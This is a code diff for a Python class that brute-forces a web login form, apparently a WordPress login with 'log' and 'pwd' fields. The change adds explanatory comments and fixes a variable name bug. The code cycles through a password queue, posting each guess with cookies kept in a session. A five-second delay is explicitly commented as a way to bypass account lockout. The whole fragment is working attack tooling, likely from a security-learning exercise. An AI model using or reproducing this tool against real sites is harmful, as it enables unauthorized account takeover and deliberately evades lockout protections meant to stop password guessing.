@@ -66,23 +66,23 @@ class Bruter:
             t.start()
     
     def web_bruter(self, passwords):
-        session = requests.Session()
-        resp0 = session.get(self.url)
-        params = get_params(resp0.content)
+        session = requests.Session() # Session obj to handle cookies
+        resp0 = session.get(self.url) # Retreive raw HTML
+        params = get_params(resp0.content) # Call get_params()
         params['log'] = self.username
         
-        while not passwords.empty() and not self.found:
-            time.sleep(5)
-            passwd = passwords.get()
+        while not passwords.empty() and not self.found: # Attemp all passwds in the queue
+            time.sleep(5) # Bypass account lockout 
+            passwd = passwords.get() 
             print(f'Trying username/password {self.username}/{passwd:<10}')
-            params['pwd'] = passwd
+            params['pwd'] = passwd # Populate param dictionary+
             
-            resp1 = session.post(self.url, data=params) 
-            if SUCCES in resp1.content.decode():
-                self.found = True
+            resp1 = session.post(self.url, data=params) # Post request with params dictionary
+            if SUCCES in resp1.content.decode(): # Retreive reult after auth and determine success
+                self.found = True # Clear queues so other threads can finish
                 print(f'Bruteforcing succesfull.')
                 print('Username is %s' % self.username)
-                print('Password is %s\n' % brute)
+                print('Password is %s\n' % passwd) # corrected from brute
                 print('done: now cleaning other threads...')
 
 
